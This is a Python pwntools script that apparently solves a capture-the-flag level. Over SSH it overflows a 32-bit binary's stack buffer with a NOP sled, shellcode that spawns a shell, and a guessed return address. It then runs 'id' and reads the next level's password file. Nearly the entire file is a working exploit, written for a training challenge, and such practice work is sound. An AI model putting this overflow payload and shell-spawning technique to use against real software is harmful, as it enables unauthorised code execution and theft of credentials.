from pwn import *
exe = context.binary = ELF('./level1')
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux.so.2')

context.aslr = False

r = ssh(user='level1', host='challenges.ringzer0ctf.com', port=10080, password='level1')

# shell
sc = encoder.null(asm(f'''
   {shellcraft.sh()}
   '''.strip()))

# remotely
# buf starts at 0xbffff7d0

# local
#retaddr = 0xffffca80

# remote
#retaddr = 0xbffff910
# why does -0x100 work but not +?
# i should have bruteforced
retaddr = 0xbffff5d0

payload = flat({
    0: b'\x90' * 800,
    800: sc,
    1036: p32(retaddr),
})

with open('level1_payload.bin', 'wb') as f:
    f.write(payload)

print(hexdump(payload))
print(payload)

# elf was prepared with
# $ patchelf --set-interpreter ./ld-linux.so.2 ./level1 
# $ patchelf --set-rpath '$ORIGIN' ./level1

gdbscript = '''
disp/5i $pc
b *0x8048440
c
x/100x $sp
'''
#io = gdb.debug([exe.path, payload], gdbscript=gdbscript)
#io = process([exe.path, payload])
io = r.process(['/levels/level1', payload])

io.sendline(b'id')
print(io.clean(1).decode())

io.sendline(b'cat /home/level2/.pass')
password = io.clean(1).decode().strip()
log.success(f"Password: {password}")

io.interactive()
